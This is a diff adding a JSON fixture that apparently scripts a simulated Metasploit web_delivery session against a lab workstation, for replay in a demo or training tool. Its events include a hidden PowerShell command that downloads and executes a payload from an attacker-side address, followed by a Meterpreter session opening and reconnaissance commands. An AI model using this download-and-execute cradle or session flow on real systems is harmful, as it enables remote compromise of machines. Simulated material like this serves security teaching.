@@ -1,0 +1,31 @@
+{
+  "id": "web_delivery",
+  "title": "Web Delivery against Demo Workstation",
+  "description": "Simulated meterpreter session resulting from a web_delivery payload executed on a lab workstation.",
+  "events": [
+    { "timestamp": 0, "output": "msf6 exploit(multi/script/web_delivery) > run" },
+    { "timestamp": 1.2, "output": "[*] Using URL: http://0.0.0.0:8080/7x3F" },
+    { "timestamp": 3.4, "output": "[*] Server started." },
+    { "timestamp": 6.8, "output": "[*] Run the following command on the target:" },
+    {
+      "timestamp": 8.5,
+      "output": "powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.0.5:8080/7x3F')\""
+    },
+    {
+      "timestamp": 14.1,
+      "output": "[*] 10.10.0.42     web_delivery - Handling request for /7x3F"
+    },
+    { "timestamp": 17.3, "output": "[*] Sending stage (175174 bytes) to 10.10.0.42" },
+    {
+      "timestamp": 20.9,
+      "output": "[*] Meterpreter session 4 opened (10.10.0.5:4444 -> 10.10.0.42:49726)"
+    },
+    { "timestamp": 24.5, "output": "meterpreter > getuid" },
+    { "timestamp": 26, "output": "Server username: CONTOSO\\\\lab-admin" },
+    { "timestamp": 29.2, "output": "meterpreter > sysinfo" },
+    { "timestamp": 31.7, "output": "Computer        : DEMO-WKS01" },
+    { "timestamp": 34, "output": "OS              : Windows 10 (10.0 Build 19045)." },
+    { "timestamp": 38.5, "output": "meterpreter > background" },
+    { "timestamp": 40.1, "output": "[*] Backgrounding session 4..." }
+  ]
+}
